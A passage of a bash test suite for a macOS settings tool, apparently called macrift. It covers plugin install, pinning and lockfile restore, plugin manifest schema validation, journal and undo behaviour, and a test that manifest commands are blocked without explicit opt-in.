    if echo "$add_out" | grep -q "Sample plugin"; then ok "add summary: shows the entry"; else no "add summary: shows the entry"; fi

    # --- update on a pinned install skips instead of failing on detached HEAD ---
    upd_out=$(_plugin_cli_update sample-plugin 2>&1)
    if echo "$upd_out" | grep -q "pinned at v1.0.0"; then ok "update: pinned install skipped with ref"; else no "update: pinned install skipped with ref" "got [$upd_out]"; fi
    if echo "$upd_out" | grep -q "Skipped: 1"; then ok "update: pinned counts as skipped"; else no "update: pinned counts as skipped" "got [$upd_out]"; fi

    # --- @<sha> pinning (falls back to full clone + checkout) ---
    fx_sha=$(git -C "$FX_REPO" rev-parse HEAD)
    rm -rf "$MACRIFT_PLUGINS_DIR/sample-plugin"
    _plugin_cli_add "file://$FX_REPO@$fx_sha" >/dev/null 2>&1
    if [[ -d "$MACRIFT_PLUGINS_DIR/sample-plugin" ]]; then ok "add: @<sha> installs"; else no "add: @<sha> installs"; fi
    eq "add: @<sha> checks out the exact commit" \
       "$(git -C "$MACRIFT_PLUGINS_DIR/sample-plugin" rev-parse HEAD 2>/dev/null)" "$fx_sha"
    eq "lockfile records sha ref" \
       "$(jq -r '.plugins."sample-plugin".ref' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" "$fx_sha"

    # --- restore: rm the plugin dir, keep lockfile, restore should reinstall ---
    rm -rf "$MACRIFT_PLUGINS_DIR/sample-plugin"
    if [[ -d "$MACRIFT_PLUGINS_DIR/sample-plugin" ]]; then no "test setup: removed dir"; fi
    _plugin_cli_restore >/dev/null 2>&1
    if [[ -d "$MACRIFT_PLUGINS_DIR/sample-plugin" ]]; then
        ok "restore: reinstalls from lockfile"
    else
        no "restore: reinstalls from lockfile"
    fi

    # --- restore: already-installed plugin is left alone ---
    if _plugin_cli_restore >/dev/null 2>&1; then ok "restore: idempotent when already installed"; else no "restore: idempotent"; fi

    # --- restore: empty lockfile is a no-op ---
    _plugin_cli_remove sample-plugin >/dev/null 2>&1
    eq "lockfile fully empty before restore-empty test" \
       "$(jq -r '.plugins | length' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" "0"
    if _plugin_cli_restore >/dev/null 2>&1; then ok "restore: empty lockfile no-op"; else no "restore: empty lockfile no-op"; fi

    # --- restore: missing lockfile is an error ---
    saved_lock="$MACRIFT_PLUGINS_LOCK"
    MACRIFT_PLUGINS_LOCK="$CLI_SBX/nonexistent.json"
    if _plugin_cli_restore >/dev/null 2>&1; then no "restore: missing lockfile errors"; else ok "restore: missing lockfile errors"; fi
    MACRIFT_PLUGINS_LOCK="$saved_lock"

    # Cleanup
    rm -rf "$CLI_SBX" "$(dirname "$FX_REPO")"
    MACRIFT_PLUGINS_DIR="$saved_pd"
    MACRIFT_PLUGINS_LOCK="$saved_lk"
    unset MACRIFT_NO_CONFIRM
fi

# == plugin schema validation (_plugin_schema_check) ==
# Mirrors schemas/plugin.schema.json — guards against the validator drifting
# from the schema. Fixtures must stay clean; representative violations must fire.
printf '== plugin schema validation ==\n'
SC="$PT/schema"
sc_check() { # name json want-substring (empty want = expect clean)
  local d="$SC/$1"; mkdir -p "$d"; printf '%s' "$2" > "$d/plugin.json"
  local out rc; out=$(_plugin_schema_check "$d"); rc=$?
  if [[ -z "$3" ]]; then
    if (( rc == 0 )); then ok "schema: $1 clean"; else no "schema: $1 clean" "got: $out"; fi
  elif (( rc != 0 )) && grep -q "$3" <<<"$out"; then
    ok "schema: $1 → $3"
  else
    no "schema: $1 → $3" "rc=$rc got: $out"
  fi
}
GOOD='{"name":"good-plug","version":"1.0.0","description":"d","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"X","entry":"E","function":"f"}}'
sc_check valid       "$GOOD" ""
sc_check badjson     '{not json'                                                                                                                                                              "not valid JSON"
sc_check badsemver   '{"name":"x-y","version":"1.0","description":"d","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"X","entry":"E","function":"f"}}'                       "version: not semver"
sc_check badname     '{"name":"Bad_Name","version":"1.0.0","description":"d","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"X","entry":"E","function":"f"}}'               "name: not kebab-case"
sc_check nodesc      '{"name":"x-y","version":"1.0.0","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"X","entry":"E","function":"f"}}'                                      "missing required field: description"
sc_check unknown     '{"name":"x-y","version":"1.0.0","description":"d","bogus":1,"compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"X","entry":"E","function":"f"}}'           "unknown field: bogus"
sc_check apiZero     '{"name":"x-y","version":"1.0.0","description":"d","compat":{"macrift_min":"26.05","macrift_api":0},"menu":{"section":"X","entry":"E","function":"f"}}'                     "macrift_api: must be an integer"
sc_check menuBoth    '{"name":"x-y","version":"1.0.0","description":"d","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"X","parent":"tweaks","entry":"E","function":"f"}}'   "mutually exclusive"
sc_check menuNeither '{"name":"x-y","version":"1.0.0","description":"d","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"entry":"E","function":"f"}}'                                   "exactly one of section or parent"
sc_check badParent   '{"name":"x-y","version":"1.0.0","description":"d","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"parent":"nope","entry":"E","function":"f"}}'                   "menu.parent: not a built-in"
sc_check badFunc     '{"name":"x-y","version":"1.0.0","description":"d","compat":{"macrift_min":"26.05","macrift_api":1},"menu":{"section":"X","entry":"E","function":"9bad"}}'                  "menu.function: not a valid bash identifier"
# the shipped fixtures must validate clean against the schema
if _plugin_schema_check "$ROOT/tests/fixtures/sample-plugin" >/dev/null; then ok "schema: sample-plugin fixture clean"; else no "schema: sample-plugin fixture clean"; fi
if _plugin_schema_check "$ROOT/tests/fixtures/other-plugin"  >/dev/null; then ok "schema: other-plugin fixture clean";  else no "schema: other-plugin fixture clean";  fi

# == core engine (common.sh) ==
# The change engine — journal, drift classification, the nvram/chflags maps that
# undo inverts. MACRIFT_NO_INIT lets us source common.sh for its functions alone:
# no errexit, no traps, no menu temp file. Real macOS reads (defaults/nvram) are
# avoided by testing the pure seams and the journal writer directly.
printf '== core engine (common.sh) ==\n'
ENG_STATE="$(mktemp -d)"
export MACRIFT_NO_INIT=1 MACRIFT_OS_VER="14.0" MACRIFT_STATE_DIR="$ENG_STATE" \
       MACRIFT_SESSION="2606-test" MACRIFT_DRY_RUN=false
# shellcheck disable=SC1091
source "$ROOT/common.sh"

# --- _drift_state: pure classification (held / reverted / drifted) ---
eq "drift: held when live matches value"         "$(_drift_state true true false 0)"  "held"
eq "drift: reverted to unset (old_null=1)"        "$(_drift_state default true '' 1)"   "reverted"
eq "drift: reverted to prior value (old_null=0)"  "$(_drift_state false true false 0)"  "reverted"
eq "drift: drifted to a third value"              "$(_drift_state maybe true false 0)"  "drifted"
eq "drift: not reverted when live != recorded old" "$(_drift_state x true false 0)"     "drifted"

# --- nvram / chflags forward maps (undo inverts these) ---
eq "nvram byte: true → %00"   "$(_nvram_byte_for_bool true)"  "%00"
eq "nvram byte: false → %01"  "$(_nvram_byte_for_bool false)" "%01"
eq "chflags: true → nohidden" "$(_chflags_for_visible true)"  "nohidden"
eq "chflags: false → hidden"  "$(_chflags_for_visible false)" "hidden"

# --- _json_escape ---
eq "json escape: double quote" "$(_json_escape 'a"b')"             'a\"b'
eq "json escape: backslash"    "$(_json_escape 'a\b')"             'a\\b'
eq "json escape: tab"          "$(_json_escape "$(printf 'a\tb')")" 'a\tb'
eq "json escape: newline"      "$(_json_escape "$(printf 'a\nb')")" 'a\nb'

# --- _journal_append: JSONL shape + old null-vs-string semantics ---
_journal_append default "Autohide Dock" com.apple.dock autohide -bool true false
_journal_append default "Show ext" NSGlobalDomain AppleShowAllExtensions -bool true default
_journal_append_dotfile "$ROOT/x" "$HOME/.macrift-test-zshrc" "/tmp/zshrc.bak"
_journal_append_dotfile "$ROOT/y" "$HOME/.macrift-test-gitconfig" ""

eq "journal: one line per append" "$(wc -l < "$MACRIFT_JOURNAL" | tr -d ' ')" "4"
if jq -e . "$MACRIFT_JOURNAL" >/dev/null 2>&1; then ok "journal: all lines valid JSON"; else no "journal: all lines valid JSON"; fi
eq "journal: prior value recorded as string"    "$(jq -r 'select(.key=="autohide").old' "$MACRIFT_JOURNAL")"               "false"
eq "journal: unset prior recorded as JSON null" "$(jq -r 'select(.key=="AppleShowAllExtensions").old' "$MACRIFT_JOURNAL")" "null"
eq "journal: dotfile bak recorded as string"    "$(jq -r 'select((.dest // "")|test("zshrc")).old' "$MACRIFT_JOURNAL")"     "/tmp/zshrc.bak"
eq "journal: dotfile no-bak recorded as null"   "$(jq -r 'select((.dest // "")|test("gitconfig")).old' "$MACRIFT_JOURNAL")"  "null"
eq "journal: session stamped on every entry"    "$(jq -r '.session' "$MACRIFT_JOURNAL" | sort -u)"                         "2606-test"
eq "journal: kinds preserved"                   "$(jq -r '.kind' "$MACRIFT_JOURNAL" | sort -u | paste -sd, -)"             "default,dotfile"

# --- manifest apply: dotfile round-trip (apply → drift → undo) ---
# Re-stub the interactive seams that `source common.sh` replaced with the real
# (tty-reading) versions, so the apply runs unattended.
confirm() { return 0; }
wait_enter() { :; }
MF_DIR="$(mktemp -d)"; MF_HOME="$(mktemp -d)"
mkdir -p "$MF_DIR/dotfiles"
printf 'managed\n' > "$MF_DIR/dotfiles/.testrc"
cat > "$MF_DIR/macrift.json" <<JSON
{ "dotfile": [ { "src": "dotfiles/.testrc", "dest": "$MF_HOME/.testrc" } ] }
JSON
: > "$MACRIFT_JOURNAL"
MACRIFT_SESSION="2606-mf" manifest_apply_cli "$MF_DIR/macrift.json" >/dev/null 2>&1
eq "manifest: dotfile copied to dest"       "$(cat "$MF_HOME/.testrc" 2>/dev/null)"                         "managed"
eq "manifest: dotfile journaled by dest"    "$(jq -r 'select(.kind=="dotfile").dest' "$MACRIFT_JOURNAL")"  "$MF_HOME/.testrc"
eq "manifest: dotfile old=null (no prior)"  "$(jq -r 'select(.kind=="dotfile").old' "$MACRIFT_JOURNAL")"   "null"
journal_undo_cli "2606-mf" >/dev/null 2>&1
if [[ -e "$MF_HOME/.testrc" ]]; then no "manifest: undo removes copied dotfile"; else ok "manifest: undo removes copied dotfile"; fi
rm -rf "$MF_DIR" "$MF_HOME"

# --- manifest build helper: defaults + brew + dotfile + plist + command ---
mb_entries="$(mktemp)"; mb_brew="$(mktemp)"; mb_dot="$(mktemp)"; mb_plist="$(mktemp)"; mb_cmd="$(mktemp)"
printf 'Autohide Dock|true|true|com.apple.dock|autohide|-bool\n' > "$mb_entries"
printf 'ripgrep\tformula\t\nThings\tmas\t904280696\n' > "$mb_brew"
printf 'dotfiles/.zshrc\t~/.zshrc\n' > "$mb_dot"
printf 'com.googlecode.iterm2\tplists/iterm2.plist\n' > "$mb_plist"
printf 'demo\techo hi\techo bye\tDemo\n' > "$mb_cmd"
mb_json="$(_manifest_build_json host "$mb_entries" "$mb_brew" "$mb_dot" "$mb_plist" "$mb_cmd")"
eq "build: defaults captured"   "$(jq -r '.defaults[0].key' <<<"$mb_json")"                       "autohide"
eq "build: brew formula"        "$(jq -r '.brew[0].name' <<<"$mb_json")"                          "ripgrep"
eq "build: brew mas keeps id"   "$(jq -r '.brew[] | select(.source=="mas").id' <<<"$mb_json")"    "904280696"
# shellcheck disable=SC2088  # literal ~ is the expected manifest value, not a path to expand
eq "build: dotfile section"     "$(jq -r '.dotfile[0].dest' <<<"$mb_json")"                       "~/.zshrc"
eq "build: plist section"       "$(jq -r '.plist[0].domain' <<<"$mb_json")"                       "com.googlecode.iterm2"
eq "build: command run"         "$(jq -r '.command[0].run' <<<"$mb_json")"                        "echo hi"
rm -f "$mb_entries" "$mb_brew" "$mb_dot" "$mb_plist" "$mb_cmd"

# --- journal appends for the new kinds ---
: > "$MACRIFT_JOURNAL"
_journal_append_brew raycast cask "" absent
_journal_append_plist com.googlecode.iterm2 /m/iterm2.plist /bak/iterm2.plist
_journal_append_command demo.id "echo hi" "echo bye"
if jq -e . "$MACRIFT_JOURNAL" >/dev/null 2>&1; then ok "journal (new kinds): valid JSON"; else no "journal (new kinds): valid JSON"; fi
eq "journal brew: source"      "$(jq -r 'select(.kind=="brew").source' "$MACRIFT_JOURNAL")"   "cask"
eq "journal brew: old=absent"  "$(jq -r 'select(.kind=="brew").old' "$MACRIFT_JOURNAL")"      "absent"
eq "journal plist: backup old" "$(jq -r 'select(.kind=="plist").old' "$MACRIFT_JOURNAL")"     "/bak/iterm2.plist"
eq "journal command: undo"     "$(jq -r 'select(.kind=="command").undo' "$MACRIFT_JOURNAL")"  "echo bye"

# --- command apply: gate + run + undo round-trip (harmless temp marker) ---
CMD_MARK="$(mktemp -u)"; CMD_DIR="$(mktemp -d)"
cat > "$CMD_DIR/macrift.json" <<JSON
{ "command": [ { "id": "mark", "label": "mark", "run": "echo x > '$CMD_MARK'", "undo": "rm -f '$CMD_MARK'" } ] }
JSON
: > "$MACRIFT_JOURNAL"
MACRIFT_NO_CONFIRM=true MACRIFT_ALLOW_COMMANDS=false MACRIFT_SESSION=2606-cg manifest_apply_cli "$CMD_DIR/macrift.json" >/dev/null 2>&1
if [[ -e "$CMD_MARK" ]]; then no "command gate: blocked under --no-confirm w/o opt-in"; else ok "command gate: blocked under --no-confirm w/o opt-in"; fi
MACRIFT_NO_CONFIRM=true MACRIFT_ALLOW_COMMANDS=true MACRIFT_SESSION=2606-cr manifest_apply_cli "$CMD_DIR/macrift.json" >/dev/null 2>&1
if [[ -e "$CMD_MARK" ]]; then ok "command apply: runs with opt-in"; else no "command apply: runs with opt-in"; fi
eq "command apply: journaled" "$(jq -r 'select(.kind=="command").id' "$MACRIFT_JOURNAL")" "mark"
MACRIFT_NO_CONFIRM=true MACRIFT_ALLOW_COMMANDS=true journal_undo_cli "2606-cr" >/dev/null 2>&1
if [[ -e "$CMD_MARK" ]]; then no "command undo: runs inverse (removes marker)"; else ok "command undo: runs inverse (removes marker)"; fi
rm -rf "$CMD_DIR"; rm -f "$CMD_MARK"

# --- dry-run journals nothing ---
: > "$MACRIFT_JOURNAL"
MACRIFT_DRY_RUN=true _journal_append default "x" com.apple.dock tilesize -int 48 36
eq "journal: dry-run writes nothing" "$(wc -l < "$MACRIFT_JOURNAL" | tr -d ' ')" "0"

rm -rf "$ENG_STATE"
unset MACRIFT_NO_INIT MACRIFT_STATE_DIR MACRIFT_JOURNAL MACRIFT_SESSION MACRIFT_DRY_RUN

printf '\n%d passed, %d failed\n' "$pass" "$fail"
[[ $fail -eq 0 ]]
